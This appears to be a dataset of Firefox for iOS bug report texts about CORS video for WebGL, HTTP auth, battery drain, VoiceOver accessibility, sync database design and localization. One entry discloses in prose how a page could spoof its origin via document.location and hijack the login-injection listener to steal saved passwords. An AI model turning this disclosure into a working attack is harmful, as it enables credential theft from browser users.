When I then signed in iOS lost the history and tabs I had between the restore and signing into sync.

It has been great pain to try and get Safari and IOS working with WebGL/WebVR with CDN hosted videos which is the standard way to deliver video. The Webkit ticket for just this is here ', It would be really good if Firefox on IOS at least provides CORS support so WebGL actually works on IOS with cross domain video without needing proxy work arounds that will never scale. It will take too long for Webkit to fix this and finally get released in IOS because lack of intervention from Apple. An example of the problem is here using raw WebGL functions not three.js ', I've yet to even check if Firefox can allow inline video playback. That is a deal break for WebGL to work on Iphone also. Non inline video will completely hide the WebGL canvas rendering WebVR useless. Actual results: CORS security errors no doubt. I can't see anything because Firefox IOS lacks remote debugging ! Expected results: An example of an integrated toggling solution for proxy video playback is here. It will detect there is no CORS support and display a button to toggle to the proxied video ", It should hopefully not need to do that.'	234

By tapping the tab button, we enter the opened tabs overview and this is disturbing when the purpose of the action was to open a new tab.

It relies heavily on speech audio via mp3 files. The mp3 files are loaded only on request (click on it) by way of XHR (using jquery framework). The mp3 files reside in a subdirectory of the same site. Actual results: Note, the following happens only with the new Firefox on iOS, not on Windows and not on Mac (I think, I'll recheck). Each *single* click/request for an mp3 file results in the http auth dialog been shown again (prefilled, as I told Firefox to remember the login data). However, the sound file isn't fetched and played even after submitting the auth dialog again. Expected results: There should be only one http auth request when entering the site and never ever after as Firefox should be sending authentication headers with each request to all ressources in that path. This is how it works with Firefox on Windows and Mac. There is a similar bug open for Firefox on Mac: ", However, I think this has been resolved as I don\'t remember seeing this happen with OS X. Further information: Safari on iOS shows a somewhat similar buggy behavior. It just "ignores" the auth request and doesn\'t show nor honor it after login. So, the result is: no speech and no auth dialogs. So, this problem may be related to some iOS/Apple API?'	255

id=1220378	 'We have had multiple reports where Firefox is using a lot of background time. In the order of dozens of hours vs hours or minutes of Screen On use. This is causing battery drain. I think I have tracked this down to the AuralProgressBar, and most likely to the recent change where we now use the audio background mode. The use of the audio background mode is good, it gives us parity with Safari. You can start a podcast from a tab, lock your phone and keep listening. The problem however is that the AuralProgressBar has an AudioEngine that, once started, keeps running in the background. Due to some logic error, introduced with a recent patch to fix a crash, the AudioEngine, is always started when audio is resumed. I have verified this with Instruments.app and the Energy Usage instrument. With the AuralProgressBar removed, the Audio CPU Activity stays at 0%. With the code enabled, and a audio suspend/resume triggered, the Audio CPU Activity will be a steady 0.8%, forever. Steps to verify: * Profile Firefox with the Energy Usage instrument * Open a new tab, browse to a quiet site like news.ycombinator.com * Look at the Audio CPU Activity, it will be 0% * Long press the home button to trigger Siri. This causes audio to suspend/resume * Cancel Siri, you are back in the application * Look at the Audio CPU Activyty, it will be 0.8% (values may differ per device) With the AuralProgressBar removed, the audio usage stays 0% I have a decent idea how to fix this and will submit a fix.

Reader Mode button (in url bar) available vs. active status is differentiated only by color (black vs. orange), no change in outline/shape. 2. Selected panel in home panel is differentiated only by color of the icon\'s outline (blue for selected, gray for non-selected) - selected color could also be distinguished by being filled inside the outline (just like the Bookmarks button in the toolbar, which does this and thus is "color-blind-proof"), or making the outline a little bit bolder (thicker than the non-selected panels). Can be nicely tested by turning on for a while this setting: Settings.app > General > Accessibility > Grayscale. Then you basically become color blind (in a basic way) until you turn it off :-) Then use the app and find "color-blind spots" ;-) Please note that tweaking only the colors to be better distinguishable in the Grayscale mode is not a good strategy as different types of color blindness can perceive colors differently (i.e. not in a way identical to the iOS Grayscale mode) - i.e. what one color-blind person perceives as sufficiently different colors could be perceived as same colors by another person with different type of color-blindness.

(exiting private mode) didSelectTab(oldTab,nil)->didRemovetab->didSelectTab(nil,newTab) I'd like to change this so didSelectTab is always called after any delete/adds. The reason being is I need to use the TabManager to help with tableview animations. Tabs can be opened from outside of the buttons in the TabTrayController. For example the menu or Today Widget. In these cases the only way to know these tabs have been created is to use the delegate methods. But because of the inconsistent way delegate methods are called and nil tabs in didSelectTab I cant animate them correctly. This bug is laying the foundation for these changes. For example look at the logic here 1 it looks awfully similar to the logic here 2 . Instead lets let TabManger accurately handle this. TopTabsVC can just use the delegate methods to listen for changes and animate those instead. Thats what I'm trying to do here 3 . All I need to do is call tabManger.removeTab and in the delegate method I can handle the animations 4 . I'll probably have to make more changes to TabManger. But I think moving view handling logic to the TabManger delegate methods will make sure that whole class of bugs we have related to Today Widgets should go away.

Depending on how sites are implementing this, they may also appear in Firefox for iOS. We don\'t currently show the option for the site to be added to the home screen from our share panel and I\'m not sure if Apple has a way for us to do that. Some ideas we can consider: A) Make our share button be in the center of the toolbar to match Safari. B) Remove Safari from the UA string. C) Investigate whether we can get "Add to home screen" to show up in our share menu. D) Fix libraries to make them not appears for Firefox on iOS.

The most obvious is to proactively prune: either don't collect, or (ideally) don't even examine unchanged subtrees. Efficiently determining whether a subtree has changed without doing the work will probably require extending data structures (e.g., to track the full child space on each node). It might also be possible to consider self-contained subtrees at the original mirror stage.

But, we have to decide if this is actually the correct behaviour that we want. It is easier to manage the webviews this way, but the drawback is that they may not correctly suspend when going to the background. This could mean a couple of things like for example more power usage and audio/video playing in background tabs.

WebKit on iOS does it for each element in the webpage and this enables VoiceOver to switch languages (voices) on the fly when reading a multilingual webpage (or a monolingual webpage in different language than the user uses, i.e. if an English user opens a webpage on French wikipedia, then VoiceOver reads the webpage in French voice with proper French pronunciation. For even more fun, try the wikipedia frontpage, which contains links to different language wikipedias in those respective languages and iOS VoiceOver reads these all properly in their respective language/voice). In a similar way, we would preferably make it so that e.g. in Top Sites, VoiceOver reads the webpage cell in the webpage language, in Cloud tabs, VoiceOver reads the webpage title in webpage language and the address in the user\'s current language, etc. This would require learning the webpage title language by injecting a JavaScript to inspect the various lang attributes in the HTML. Then saving the learned webpage title language along with the webpage title, in a separate field/column. We would then use this language value to set accessibilityLanguage where appropriate to take effect on the webpage title in the UI. This presents one challenge as I thought about it - some of these saved websites will be synced to some "Firefox cloud" (forgive me that I don\'t know its precise name :-). I.e. Cloud Tabs. For this feature to work here, there would need to be support for language attribute (field, column) also in the cloud backend, and also on the other Firefox products (not necessarily to use the language value, but at least extract it from the webpage and save it). Other place where this could be used similarly is with Firefox for Windows when used with JAWS, which supports language switching (at least I saw JAWS do that with some browser and in Word, not 100% sure it can do it with Firefox, whether it requires MSAA/IAccessible2/or UIA).'	385

We should take a hint from App Switcher (which is in principle very similar to Tab Tray) to make e.g. a crossfade animation in/out of the Tab Tray instead of the "flying tabs" in case where the user has turned on the "General > Accessibility > Reduce Motion > Reduce Motion" setting.

id=1223105	 'See ', . We can\'t ever synchronously act on our databases from the main thread. That means we can\'t assign them in init if assignment implies full construction, nor can we initialize tables in init, nor can we block on actions that touch the DB in most places. In order to get to this point we need two things: * BrowserDB needs to be a lazy wrapper that only exposes asynchronous methods. Internally it will "chain on a promise" -- do work after init has been done. We can do this with dispatch_once. * SQLiteHistory et al -- consumers of BrowserDB and each other -- need to expose Deferreds to allow them to chain off each other\'s delayed initialization. So one might do: self.profile.history.addLocalVisit(visit) which will be: SQLiteHistory.swift: public func addLocalVisit(visit: Visit) -> Success { return self.init() >>> { // Old function body goes here. } } ... public required init(db: BrowserDB) { self.db = db } ... public func init() -> Success { return self.db.init() >>> { // Old init goes here. } } ... or something equivalent. The scary thing about this is that our motivation for doing so is to unblock the main thread, but if we take thirty seconds to open the DB the UI will be sparse and useless. We don\'t want to queue up behavior like deciding whether to show the bookmark star, and we don\'t want a blank top sites panel. That leads me to wonder whether we should WONTFIX this bug.

We don't want to delete everything from the server and request a full remote re-sync: it's expensive (every client must upload and download everything, including us), and the server might be the user's only copy of their data. A decent middle ground is to delete just the records that might conflict, then send resetEngine. This should be equivalent to a wipe-and-re-sync, but without the full reupload/redownload.

I don't think we support deleting saved logins at all, so there *should be no deleted logins at all* in the local database.

The only way invalid records would be uploaded is if: * An incoming record reconciles against a local record. * The delta resolution process produces a mess.

id=1270855	 'The goal is to be able to identify l10n issues during the development cycle, since checking for problems right before extracting strings is not a valid approach. What happens right now: * I periodically update the code repository, and extract English string in a .xliff file with xcodebuild -exportLocalizations -exportLanguage en -localizationPath /path/to/folder/ * I then compare it with a current development version of Italian stored in a separate repository ', and check for differences. * If there is an issue I need to go through the history on GitHub to identify the bug that introduced it. That would be on Delphine from now on, and it would be much simpler to only have to analyze the history of such file on GitHub. What I'd like to have: * Developer creates the build as part of his work. The build at the end automatically generates the .xliff file, for example as ~/english.xliff * Developer only needs to make sure to add this file to the commit. If the PR doesn't change any string, the diff will be empty and the file automatically ignored. What we gain from this: we have the .xliff in the repository, we have a meaningful history, and devs can also double check if their work make any funny change to the strings."	210

These identifiers are internal, non-user-facing IDs that can live alongside accessibility labels.

Typically, the labels for text fields are the text field contents themselves; however, we set the URL bar label to "Address and Search" to make it easy to grab in KIF tests.

I can get back to the original set of tabs by closing and then relaunching the app. Originally I was force closing the app through the multitasking switcher but this doesn't seem to be required. It seems like there is some kind of weird issue with the database here where two sets of open tabs are being stored. ----"	165

Because we don't want to wrap every piece of the WKWebView API that we're using, we do still need BVC to have direct access to the webView for setting up WK delegates, hooking into the back/forward list, etc. It'd be nice to figure out a way to make Browser exclusive to BVC and hidden to everyone else (similar to friends in C++), which may mean we should define BVC and Browser in the same file."	137

My best course of action now is to uninstall and set up Sync again: I can\'t possibly wait for 80,000 records to upload, and then redownload on each of my other devices. There are probably multiple bugs here: - logins.db should not have been trashed. We should re-examine our recovery approach: can we recover without losing the contents of the file? SQLite itself should not lose data even in a crash. - This re-download and re-apply shouldn\'t result in 80,000 records to upload. I\'d need to leave my device at home on wifi for hours. Those history items aren\'t really changed. - I\'m puzzled why we were triggered to re-download bookmarks and history. Bookmarks that I created locally (which can\'t have synced) are still present in the DB, which implies that browser.db was not deleted and recreated. My hypothesis is that logins.db got trashed, NotificationDatabaseWasRecreated was sent, but the filename was not "logins.db", so handleRecreationOfDatabaseNamed reset Bookmarks and History, too. - We should again reconsider whether we download all history. A user with a decent backlog but a poor network connection might never get fully in sync!'	471

id=1258273	 'When `webkit-playsinline` is set on a `<video>` element, videos should be played inline. The Safari for iOS 1 and Chrome for iOS 2 browsers do not support inline videos. In order to play an inline video, you must create (or install) a custom native app that is a webview that allows inline video playback - or you must launch a webapp from iOS\' Safari standalone browser (if a web page has the correct `meta name="apple-mobile-web-app-capable" ` tag). For old historical reasons 3 , Safari for iOS does not allow inline videos to be played even when `webkit-playsinline` is set on a `<video>` element. Based on my research, the original reason was that most web sites playing inline video were 2D, non-mobile-optimised sites that played videos in containers that were of less-than-ideal dimensions. Since then, WebGL has been introduced and mobile/responsive sites are now prevalent. Modern-day use cases for inline video include video projected in 3D perspectives. Especially important is the Cardboard WebVR use case. There are many folks trying to play 360\xb0 video in a web browser, but only Android browsers provide that experience today. As a member of the WebVR team here at Mozilla, we\'re approached by 3-5 folks per day in our Slack who want to play inline video on iOS but cannot (or do not understand why it\'s not possible \u2013 without the "Add to Homescreen" workaround or `<video>`-to-`<canvas>` hacks). I cannot name all the names here, but there are many agencies, individuals, and publications that want to see a browser properly support inline video playback for WebVR experiences (one in particular that recently blogged frustration about this is The Washington Post 4 ). This is also an issue often brought up in the three.js community 5 . It would be a definite **huge** win if Firefox for iOS were to be the first browser for iOS that supported inline (and autoplay-by-default) video playback. For what it\'s worth, Firefox for Android already allows videos to be autoplayed by default (Chrome for Android does not). And Firefox for Android has a user setting that allows autoplay to be toggled - in the event that the user encounters some sites that maliciously take advantage of this. I propose that inline video playback be supported in Firefox for iOS if `webkit-playsinline` is set on a `<video>` element and that autoplay video playback be enabled by default but toggle-able by a user setting. \u2013\u2013 1 ', 2 ', 3 ', 4 ', 5 '	391

VoiceOver only identifies the whole screen as "Tabs Tray", but there are no individual controls to swipe to or find by exploring the screen. Steps: 1. Run build 5. 2. Go to a page. 3. Turn on VoiceOver by going to Settings/General/Accessibility/VoiceOver and turn it on. Note that this changes your gestures. Single tap highlights, double-tap activates, swiping left and right goes back and forth between controls. 4. It might be a good idea to set the triple-click home to toggle VoiceOver in Settings/General/Accessibility/Triple click home, at the bottom of the Accessibility screen. That way, VoiceOver can easily be toggled on and off. 5. Return to Fennec and find the "Show Tabs (1)" button at the top right. Once it\'s highlighted, double-tap anywhere on the screen to activate. 6. Touch anywhere on the screen. VoiceOver will read, and possibly put a box around, the whole screen without being able to identify different controls within this screen. The controls need to be exposed via the UIAccessibility protocol and friends, the container will be an UIAccessibilityContainer with the individual controls added, they all need the correct AccessibilityActivation set etc. They seem to not be inheriting from the standard UIKit things any more. There is no information exposed at all. This is a regression from the first build I tried, build 1, where this tray worked for the most part.'	228

This is supported by Safari. We can learn about the correct font size for a specific dynamic type category (e.g. UIFontTextStyleBody) using: UIFontDescriptor.preferredFontDescriptorWithTextStyle(UIFontTextStyleBody).pointSize If we need a font size that does not fall into the 6 Dynamic type categories, we could choose one of the 6 categories as a "base" category for that size and "derive" the needed size by applying percentage of the base size - e.g. "80% of the Caption1 style". This would preserve the relative differences of font sizes no matter what setting the user chose for "Text Size" and would still allow us to use more than the 6 base size categories to provide a custom experience. This would improve the UI for low-vision people and senior citizens who have trouble seeing normal-sized text (provided they set the Text Size setting appropriately, or that someone sets it for them).'	261

And the load event does not fire here because the iframe has no "src" attribute. If I were to add a "src" attribute, e.g. just pointing to a blank html file, the load event does fire. This behaviour is totally different from how we have come to expect it to work in other browsers. Chrome and Safari on iOS work as expected. All of the other desktop browsers work as expected, too, including Firefox. I haven\'t yet tested this on the Android version of iOS. It\'s worth noting that the iframe element does not need to have a src attribute in the HTML5 spec. I\'ve also noted that the behaviour doesn\'t change when adding the srcdoc attribute. This is also an issue in the Dolphin browser on iOS. FWIW I have created a test case here: ', Note, this should be a completely blank page regardless, but if you visit on Firefox on iOS, nothing will happen. If you visit using any other browser you should get an alert that reads: "load event fired on iframe" Actual results: The load event does not fire on an iframe element when the src attribute is empty or missing. Expected results: The load event should fire. A src attribute is not required according to the HTML spec.'	271

Essentially, any site can steal your username and password from any other site. How it works: We use the browser URL to build our passwords origin in Logins.swift. Through some experimentation, I found that if a page triggers a change to document.location, the Browser's URL is updated before the page actually changes. From there, the page can post a webkit request under the spoofed URL and override the window.__firefox__.logins.inject listener to steal the data.

Make sure the "Client" scheme is selected 4. Connect an iOS device (which is registered in iOS dev program) to your Mac and make sure the it is selected as the target on which to run (as opposed to running on simulator). 5. Run Firefox (Cmd-R) Actual results: Build complains about things like: Failed to code sign "SendTo". No valid signing identities (i.e. certificate and private key pair) matching the team ID \u201c43AQ936H96\u201d were found. Xcode can attempt to fix this issue. and Failed to code sign "ShareTo". None of the valid provisioning profiles allowed the specified entitlements: com.apple.security.application-groups, keychain-access-groups. Xcode can attempt to fix this issue. A workaround is to edit the entitlements of Client, SendTo and ShareTo targets and remove the capabilities/entitlements ("Keychain Sharing" and "App Groups"). This is however a very unpleasant process, as Xcode (at least for me) seems to often not save the changes and returns back to the original values (I remember succeeding only on second or third attempt). I currently have a stash with these changes (called "build"). Whenever I have to do a rebase (or anything else requiring clean git tree), there cannot be any uncommitted changes, so I must reset hard to HEAD and after rebasing apply the stash again. This makes it very complicated for a casual contributor to come by, checkout the code, test their fixes in simulator and *device*. Also even if overcome (as I did), it still is tiring to keep the "build" stash and hard reset to HEAD every time git requires a clean tree and reapply the stash everytime afterwards. (Not to mention that Xcode 6.3 seems to crash whenever I apply the stash or hard reset to HEAD making the changes to Xcode project files). There are things that cannot be tested well in simulator, like accessibility with VoiceOver and Switch Control. Running in simulator works fine. It\'s just running on device that this bug complains about. Expected results: After step 5, Firefox should build and run on the user\'s iOS device. This could be achieved e.g. by having some scheme which would build Firefox without the functionality/capabilities/entitlements requiring an non-wildcard App ID. I don\'t understand in great detail the process of signing/App IDs/Team IDs, so there might be a different, better solution. Anyway the solution, either if it already exists or is added later, should be described in the README.md in "Building the code" section.'	437

The current process is as follows: Export source strings into en.xliff file: 1) Clone the project repo from ', into a local repo. 2) Open up Client.xcodeproj in xcode. 3) With the Client project active (left-hand pane), click Editor->Export for localization. 4) Create a new folder outside of your local repo clone into which the en.xliff file will be exported. 5) Be sure that the "Developer language only" option is selected from the "Include:" dropdown menu. 6) Once exported, change the name of the file to firefox-ios.xliff. Export new source strings into target language xliff files: 1) Clone the project repo from ', into a local repo. 2) Open up Client.xcodeproj in xcode. 3) With the Client project active (left-hand pane), click Editor->Export for localization. 4) Create a new folder outside of your local repo clone into which the en.xliff file will be exported. 5) Be sure that the "Existing translations" option is selected from the "Include:" dropdown menu and that all locales are selected from the checkbox menu below it. 6) Once exported, change each file name to firefox-ios.xliff and place it in it\'s corresponding directory (maybe this should be done away with and xliff files should retain their originally exported names). Import target language xliff files: 1) Make sure you have updated your local github project clone, carthage, and your SVN locale repos. 2) Open up Client.xcodeproj in xcode. 3) With the Client project active (left-hand pane), click Editor->Import localizations. 4) Navigate to your locale\'s local SVN directory, select the .xliff file, and click Open. 5) A sheet will appear which displays what will be imported. Click Import. If this is a new localization, xcode will read in the locale code from the .xliff file\'s first <file target-language=""> and add it to the list of the project\'s localizations. If this is an existing localization, it will import the new strings. In order for localizations to be included in the Fx for iOS builds, the string resources need to be imported into a local xcode project and the project must then be pushed into github. From there, when xcode server kicks off a build, it will do so according to the xcode project\'s build specifications in the github xcode project, which should have the localizations added to it. Export can be automated easily with xcode commandline tools using this command and then commiting the changes to each SVN directory: xcodebuild -exportLocalizations -localizationPath <dirpath> -project <projectname> -exportLanguage <targetlanguage> Import is cannot be done with xcode commandline tools. A human must manually import each xliff file into their local xcode project and then push those changes into the master branch of the github project. The cadence for this is a bit tricky when it comes to simultaneous dev & l10n. Dev can only export new strings for translation *after* having first imported new translations into the project and pushed them to github. This cadence is simplified once a string freeze is in place. Export happens only once (at string freeze) and throughout the remaining duration of localization, import is the only action needed until the l10n team has tested and signed-off on their work.'	520

Inserts into the visits currently have to do a separate lookup in the history table for the site id. We can do that in one command. Some perf testing on desktop shows about a 25% boost (i.e. 1.5 vs 2s to insert 10,000 entries). Seems like an easy win. 2.) Improve the date sorting. We current do our sectioning in the history view by iterating through all the data and looking at dates. There's no reason we can't just do 4 separate queries for it though (it also makes the code a lot cleaner). There's probably overhead to repeating the query 4 times, but it shows about an order of magnitude perf difference for me."	131

I think that is because i have multiple tabs open so at app startup, when the first webView(didFinishNavigation:) is fired, there is a change that the other tabs have not started loading yet so their URLs are nil. However, this storeChanges code that is triggered loops over ALL tabs and assumes they are all loaded. The quick fix is that URL is an optional and should thus not be assumed to be non-nil. A bigger fix would be to delay storeChanges() at startup and not call it until all tabs have loaded. Or not call it at all because the tabs are most likely exacrtly the same as when the app was quit.

This bug tracks the initial work for hacking on this, and it'll incorporate ", . Follow-up work might switch out the DB layer, change its signatures (particularly getting rid of the inout NSError approach and switching to Deferred), and reconcile the various uses we have for Site/Visit/etc. --- * I want the storage representation and the API to be decoupled, so that we don't need to, say, pass a Site to foo.insert just because foo.query ends up giving us Sites. This is particularly relevant in joins\u2026 but almost everything we do with history is joined, and the same is true for anything that uses a favicon. This coupling (again, particularly in joins) leads to some crazy stuff. For example: ", VisitsTable needs to fill in all the details of the site, even though it doesn\'t know them! And we thus can\'t make a Site\'s URL an NSURL, because "" isn\'t a valid URL. But a Site can\'t not have a URL, so we can\'t make it optional; nope, this is simply a modeling error that we\'ve lived with until now. The visits table just doesn\'t know about site URLs! But changing this is hairy. Do we switch this table to be just Visit (a simple timestamp/type pair)? Do we need a "SiteIDVisit" that has the siteID but not the site URL and title (because only get those from the join)? I started digging into this earlier today, and ran into snags in every direction. This is the pain point of an ORM: you get an explosion of classes, or an explosion of optional fields, or you have to switch to untyped Dictionaries, whenever you introduce a new join or a new projection. And we\'ve got a few of these, and will get more real soon\u2026 * I want to fix Cursor, so you\'ll have profile.browser.sitesVisitedSince:(Timestamp) -> Cursor<Site>, not profile.history.query(Options) -> Cursor. This\'ll make calling and DB code much more pleasant. This is part and parcel of decoupling APIs and storage: the \'shape\' of the cursor you get back is a property of the query! * "Table" starts to break down when the API ("history") isn\'t a close correspondence with storage. For example, as I\'m introducing syncability I need to add the concept of a local overlay on a remote mirror. Most of the rest of the codebase doesn\'t need to know about this, but as a result callers can\'t just insert into or query a plain ol\' table; the query is really a UNION ALL over a subquery, or a LEFT OUTER JOIN, or something else. As Nick mentioned, this also gets painful in the CP world on Android, but at least there we\'re given the opportunity to write the SQL. * I want strongly defined APIs: so not foo.update(Site) but foo.visit(URL, type). At its logical extreme we get stuff like foo.getMostRecentVisitTime(URL) -> Deferred<Result<Timestamp?>>, which is totally clear and immediately consumable \u2014 no cursor nonsense for callers to deal with, and much better perf envelope, because the implementation gets to run the best query for the job. Moreover, this gives me a fighting chance of tracking sync metadata for changes \u2014 reading list taught us that trying to work backwards from general change to specific intent is hard to do well. * I think we\'ll get much more understandable code if you don\'t need to hop between History, SQLiteHistory, HistoryTable, Site, Visit, VisitTable, etc. to understand how a history item is added. This is particularly important when you consider how Sync is going to work: it needs to get a bunch of bookkeeping just right for every write (and even some reads!), and that\'s much harder when the definition of a write is spread across multiple source files.'	629

id=1191687	 'When I confirm some links on the web, then in addition to the browser starting navigation to the new page, a context menu (sheet) is also displayed that is normally displayed only after long-pressing the link. This quite seriously degrades the core browsing experience for VoiceOver users. The issue does not happen on every link, but happens often enough to be significant. Steps to reproduce: 1. Open www.google.com 2. Enter "Alamofire" into the search field and confirm on keyboard using the "Search" button 3. When the results page loads, turn on VoiceOver 4. Navigate the VoiceOver cursor to the "Alamofire/Alamofire - GitHub" link (by directly touching it, or flicking right with one finger) 5. Open the link (by double-tapping anywhere on the screen, or by split-tap - hold the link with one finger and tap once anywhere on the screen with another finger) Expected Results: The Alamofire\'s GitHub page would start loading, and eventually load. Actual Results: The Alamofire\'s GitHub page starts loading and at the same time an action sheet with "Open In New Tab" and "Copy Link" with title "', " is displayed. Notwithstanding this, the webpage loading continues in spite of the action sheet being displayed. What is even more strange (what I consider a VoiceOver bug), after the webpage fully loads, sometimes the VoiceOver cursor moves into the webpage, even though the modal sheet is still being displayed. But sometimes, it stays in the sheet (this I would guess is probably based on relative timing of some events due to different pages loading differently long - it seems for swiftly loading pages, the sheet is displayed after the page is loaded, and the VO cursor stays in it, but for pages that take long to load, i.e. that load after the sheet is displayed, the VO cursor moves to the sheet first when that is shown, and then to the webpage when that is loaded). The user can dismiss the sheet (when in it) using the scrub "escape" gesture. The sheet is sometimes triggered even by an accessibility scrub "escape" gesture. This is a regression, as this issue used to not be present (but I cannot really say since when).'	354

Because we only test the creation code that\'s in the tree, we don\'t actually know if our upgrades work at all.

When I opened up my computer, the tab was waiting for me (which is good). However, the tab wouldn't load (which is bad). I hit the refresh button several times, nothing happened. I finally put my cursor in the URL bar and hit 'enter' on the keyboard, and that finally loaded the page. A pain, but the workaround worked. I started doing some other things. Then I noticed I had 2 other 'repeat' tabs of the tab I had sent ('Nest's Hub Shutdown'). I didn't think much of it, thinking it was user error on my part (since I had tried reloading it several times). I closed them down, saving one of the instances so I could actually read it. But as I started doing other stuff in the browser (load a new tab, open a link from an email, etc) I realized that this same 'Nest's Hub Shutdown' article has been opening up in new tabs again. I know it's not user error this time - it's just doing it on its own. I can't get it to open consistently if I open a new tab or a link - there's some other sequence of events that needs to happen. And it's just happened again now! I had opened another link from my email, was typing away in that tab, moved away from that tab to this tab to continue writing in this bug, and then suddenly a new instance of the article has just loaded up in this window next to the two other tabs I've been working away on.

Not sure, but feels like a bug in WebKit? This can be tested with e.g. putting alert("pageshow"); in the pageshow handler at the end of ReaderMode.js - after some time of going back/forward (usually 2-3 cycles), it stops alerting. The same happens for "pagehide". I discovered this actually when working on my LangInfoHelper for ', , I too want to do work (extract language tags) on pageshow, and get the same issue. As webView:didFinishNavigation: gets called reliably (i.e. even when pageshow is not called), an alternative could be calling the needed stuff from there using evaluateJavaScript:completionHandler:, the downside being that that would be circumventing the BrowserHelper abstraction a little bit (we would not be relying on WKScriptMessage handling and dispatching to helpers done in the Browser class), and we would unconditionally need to expose the helpers' JavaScript to the webpages (no one-time-executed anonymous functions, but functions would be needed to be available in some _firefox_<FeatureName> namespace) - but ReaderMode does that already anyway, so no big deal."	322

These records are unique in that they normally cannot be independently added to, modified, or deleted; even deleting or reordering a leaf bookmark requires modifying its parent record and atomically applying that change.

Our judgment about when the server mirror can be applied -- that is, our assessment of whether it is *complete* (fully downloaded) and *consistent* (=> fully uploaded by another client) becomes important and non-trivial. 2. Record reconciling is a structural operation. Desktop uses a computed map for this; it would be unwise to follow the same approach. The difficulty of correctly handling local changes here is enough motivation that we might use a replayable transaction log to limit the possibility of hard-to-resolve conflicts. I intend to solve this problem last, and very likely in stages of limited scope (e.g., read-only server bookmarks, unsorted list of local bookmarks that are easy to reconcile).

As I am not an iPhone user, I am guessing this is the same feature but worded differently, in that case I would suggest keeping consistency with our own support site. We have recently worked with release managers to get the What's New section localizable for Google Play and created an API that they can consume to automate the publishing process, we are testing it now with a couple of locales for Firefox 44 and the that will start at scale with Firefox 45. We can add that feature in our tracking tools for Apple Appstore too, have the content translated and add a public Json API and web views for whoever publishes updates to the What's New section. We are waiting on Mike's confirmation on the copy and also on the fact that what we get translated will be published on the Appstore (and that includes follow up fixes for typos or rewording if necessary).

For example, jal.jp really does have a broken cert that we don't trust. My suspicion is that we also set ourselves up for failure. For example: a site only listens on www.domain.com. Or it only has a cert for m.domain.com. We prune that down to domain.com, try to load that when you tap the top site, and end up with a security error. There are a few potential fixes for this. One is for top sites to always be the greatest common domain and greatest common path. So if a top site is produced by m.www.foo.com/noo/baz www.foo.com/noo/bar the top site tile is www.foo.com/noo/ This will avoid some problems. Another is for the URL loaded as a result of tapping the site to be one of a candidate set. And another is for us to be aware of SSL certs when computing the domain for a site. We need to be very careful about making domain computation depend on external factors, because we rely on collisions when syncing, but this is one of the only ways to make this really smart."	204

id=1130228	 'Right now, we have XCTest unit tests, which we use to build "white box" tests for individual components. We need a way to run "black box" UI automation tests that can run browser tests as a user would. The standard Automation tool, part of the Instruments application, uses JS scripts to build these tests. These tests use accessibility labels as a generic way to hook into views (as opposed to findViewById on Android). They are documented extensively at 1 . Here\'s my take on Automation: * No built-in Xcode Server integration. You can, however, start the scripts from the command line, so this might still work. I haven\'t really played around with this much. * The editor is awful. No code completion or IDE tools, and running the test annoyingly switches between the script and log views. Most people probably choose to edit their scripts externally, but it\'s unfortunate that we don\'t get the same IDE advantages as writing normal code. * It\'s not clear how we would set up a mock server for testing. We\'ll need a way to serve mock pages to test things like navigation, session restore, and all other sorts of browser features. We might be able to piggyback off of the existing built-in web server if we can figure out the port it\'s running on. There\'s a whole suite of other tools in the Instruments panel besides Automation for all sorts of perf-related tests: CPU/disk/network usage, memory allocation, and even energy usage. It would be really nice if there was a way to get all of these automated, but it looks like they\'re meant only for local profiling. I\'ve read good things about KIF (made by Square), so I decided to give that a try. Like Automation, KIF uses accessibility labels as hooks. Some initial observations: * Unlike Automation, KIF tests are written in Obj C/Swift, and KIFTestCase even subclasses XCTestCase. This means we should have Xcode Server integration out of the box. * Since it\'s written as a regular XCTest, that means we get the same IDE support. Debugging, code completion, etc. * Since it\'s written as a regular XCTest, that also gives us more control of the actual test environment, enabling us to do things like run a test web server. * Accessibility labels even works with the content pages of UIWebViews, which would be pretty awesome for testing any mock content. Unfortunately, WKWebView doesn\'t currently work 2 . This shouldn\'t be a deal breaker, though, since we can reimplement some of this functionality with JS injection. 1 ', 2 '	413

This\'ll likely involve defining some internal interfaces (e.g., deciding exactly how to tell Sync that we\'d like to clear private data, and what that means), defining various kinds of failures and read/write (e.g., we should still be able to show your bookmarks when you\'re offline), etc., and will thus be intertwined with the implementation of our first non-trivial synchronizers in ', .'	162

What availability of long-press on a button for sighted people really means is that there is more than one thing, action achievable with that button. VoiceOver has a native concept for this called accessibility custom actions. So it is natural to provide such action as accessibility custom actions for VoiceOver. E.g. instead of long-pressing the Reader Mode button for adding item to reading list, which would be communicated to VoiceOver user by an explicit accessibility hint like \u201cDouble-tap and hold to add item to reading list\u201d, `accessibilityCustomAction` should be added to the button which is called \u201cAdd to Reading List\u201d. No hint is then needed to be set on the button, as VoiceOver provides a hint itself that custom actions are available on the button (even when VoiceOver hints have been turned off by the user). The user then can comfortably choose the alternative action by swiping up/down. On the location label, there are 3 actions presented as UIAlerts after long-press, for VoiceOver best would be to have them available all as 3 custom actions.'	198

Actual results: VoiceOver says "URL". (The "URL" accessibility label got added because of testing with KIF.) Expected results: VoiceOver says a message that includes the displayed address, e.g. "www.cnn.com". One solution could be to leave the accessibilityLabel fixed at "URL" (maybe only change it to something more user-friendly like "Address") and set accessibilityValue with the address; VoiceOver would then say "URL, www.cnn.com". But in case of the "Search or enter address" state, it would be preferable to have "Search or enter address" as the accessibilityLabel (which is default as it is the displayed title, i.e. it could be achieved by setting accessibilityLabel to nil) and having no accessibilityValue. Another solution (which would mimic Safari accessibility) would be to keep things simple and have accessibility label to be the address, with no accessibility value. This is btw. what we get by default if we do not set accessibilityLabel explicitly on the label (i.e. UILabel implicitly has no accessibilityValue and returns its title in accessibilityLabel). I am leaning to this solution. In the case of the second solution, accessibility tests relying on "URL" accessibility label of the location label will need to be modified. Either to refer to the displayed string instead of "URL" (i.e. refer to "Search or enter address" or "www.cnn.com"), or add accessibilityIdentifier to the location label and use the identifier KIF methods from IdentifierTests category on KIFUITestActor (in KIF/KIFUITestActor-IdentifierTests.h).'	257

